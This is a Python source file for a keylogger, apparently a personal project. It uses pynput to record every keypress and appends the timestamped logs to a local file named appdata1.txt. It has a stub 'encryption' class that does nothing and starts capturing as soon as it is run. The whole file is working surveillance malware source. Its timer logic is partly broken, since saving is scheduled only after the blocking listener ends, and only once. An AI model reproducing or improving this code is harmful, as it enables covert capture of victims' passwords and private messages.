from pynput import keyboard
import datetime
import sys
from abc import ABC,abstractmethod
from threading import Timer


class KeyloggerService:
    def __init__(self):
        self.logs = []
        self.listener = None
        # self.exception = {keyboard.Key.tab, keyboard.Key.enter, keyboard.Key.alt,
        #                   keyboard.Key.alt_l, keyboard.Key.alt_gr, keyboard.Key.backspace,
        #                   keyboard.Key.caps_lock, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
        #                   keyboard.Key.shift_l, keyboard.Key.shift_r}


    def on_press(self, key):
        if key == keyboard.Key.alt_l:
            print(self.logs)
        if key == keyboard.Key.space:
            key = " "
        # if keyboard.Key in self.exception:
        #     key = f" {key} "
        self.logs.append(key)


    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False


    def start_listener(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()



    def stop_listener(self):
        if self.listener:
            self.listener.stop()
        sys.exit(0)


    def clear_logs(self):
        self.logs = []
        return self.logs


class Writer(ABC):
    @abstractmethod
    def writer(self,data):
        pass

class FileWriter(Writer):
    def __init__(self):
        self.path = r"C:\Users\st\KeyloggerProject\appdata1.txt"



    def writer(self,data):
        with open(self.path, "a") as logfile:
            for i in data:
                logfile.write(str(i))

class Encryptor:
    @staticmethod
    def encrypt(data):
        return data

    @staticmethod
    def decrypt(data):
        pass


class KeyloggerManager:
    def __init__(self):
        self.keylogger_service = KeyloggerService()
        self.filewriter = FileWriter()
        self.encryption = Encryptor()
        self.start_time = None
        self.timer = None


    @staticmethod
    def get_time():
        dt = datetime.datetime.now()
        return dt.strftime('***** %d/%m/%Y %H:%M *****')

    def save_data(self):
        encrypt_data = self.encryption.encrypt(self.keylogger_service.logs)
        self.filewriter.writer(self.start_time)
        self.filewriter.writer(encrypt_data)
        self.keylogger_service.logs = self.keylogger_service.clear_logs()
        self.start_time = KeyloggerManager.get_time()



    def start_logging(self):
        self.start_time = KeyloggerManager.get_time()
        self.keylogger_service.start_listener()
        self.timer = Timer(interval=10,function=self.save_data)
        self.timer.daemon = True
        self.timer.start()


# s = KeyloggerService()
# s.start_listener()
test = KeyloggerManager()
test.start_logging()









